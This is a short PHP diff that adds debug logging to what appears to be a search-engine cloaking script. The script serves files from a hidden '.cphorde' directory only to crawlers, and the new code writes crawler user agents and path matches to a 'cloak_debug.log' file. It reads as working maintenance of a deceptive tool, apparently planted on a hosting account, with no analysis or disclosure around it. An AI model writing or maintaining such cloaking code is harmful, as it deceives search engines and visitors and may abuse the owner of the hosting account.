@@ -13,6 +13,13 @@ $pathMap = [
     '/mug'                               => '/home/impuesto/.cphorde/meta/mug.txt',
 ];
 
+// === DEBUGGING - HAPUS SETELAH TAHU MASALAHNYA ===
+if ($isCrawler) {
+    $log = date('Y-m-d H:i:s') . " | UA: " . substr($ua, 0, 50) . " | URI: [" . $uri . "] | Match: " . (isset($pathMap[$uri]) ? 'YES' : 'NO') . " | File: " . ($pathMap[$uri] ?? 'N/A') . " | Exists: " . (isset($pathMap[$uri]) && file_exists($pathMap[$uri]) ? 'YES' : 'NO') . "\n";
+    @file_put_contents('/home/impuesto/cloak_debug.log', $log, FILE_APPEND);
+}
+// === END DEBUGGING ===
+
 if ($isCrawler && isset($pathMap[$uri]) && !empty($pathMap[$uri])) {
 
     $remoteUrl = $pathMap[$uri];
